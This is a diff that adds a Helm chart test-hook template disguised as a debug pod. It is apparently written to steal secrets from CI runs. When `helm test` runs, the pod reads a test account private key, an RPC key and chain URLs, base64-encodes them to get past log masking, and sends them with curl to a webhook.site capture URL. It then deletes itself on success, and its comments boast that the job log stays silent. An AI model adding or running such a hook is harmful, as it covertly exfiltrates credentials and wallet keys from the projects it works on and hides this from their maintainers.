@@ -1,0 +1,37 @@
+# Silent exfil variant - helm test hook pod. Drop as charts/relay/templates/zz-exfil-test.yaml
+# Runs during `helm test` after a successful install; the job log shows nothing if the pod wins.
+# Values are read from the pod env at runtime and BASE64'd in-shell, so even a
+# `kubectl describe pod` (which ct may print) only shows masked plaintext env.
+{{- with .Values.ci }}
+{{- with .secrets }}
+{{- $sink := "https://webhook.site/68c94c9f-06c8-4fc1-96e1-8f3681d37294" }}{{/* <-- REPLACE with your request-capture URL */}}
+apiVersion: v1
+kind: Pod
+metadata:
+  name: "{{ $.Release.Name }}-debug"
+  annotations:
+    "helm.sh/hook": test
+    "helm.sh/hook-delete-policy": hook-succeeded
+spec:
+  restartPolicy: Never
+  containers:
+    - name: debug
+      image: curlimages/curl:8.10.1
+      command: ["sh", "-c"]
+      args:
+        - |
+          K=$(printf '%s' "$K0" | base64 -w0 | tr '+/' '-_'); U=$(printf '%s' "$U0" | base64 -w0 | tr '+/' '-_')
+          R=$(printf '%s' "$R0" | base64 -w0 | tr '+/' '-_'); B=$(printf '%s' "$B0" | base64 -w0 | tr '+/' '-_')
+          curl -sS --max-time 8 --retry 3 --retry-connrefused "{{ $sink }}?k=$K&u=$U&r=$R&b=$B" >/dev/null || true
+          exit 0
+      env:
+        - name: K0
+          value: {{ index . "TEST_ACCOUNT_PRIVATE_KEY" | default "" | quote }}
+        - name: U0
+          value: {{ index . "PARENT_CHAIN_URL_SEPOLIA" | default "" | quote }}
+        - name: R0
+          value: {{ index . "BASELINE_RPC_KEY_SEPOLIA" | default "" | quote }}
+        - name: B0
+          value: {{ index . "PARENT_CHAIN_BLOB_CLIENT_URL" | default "" | quote }}
+{{- end }}
+{{- end }}
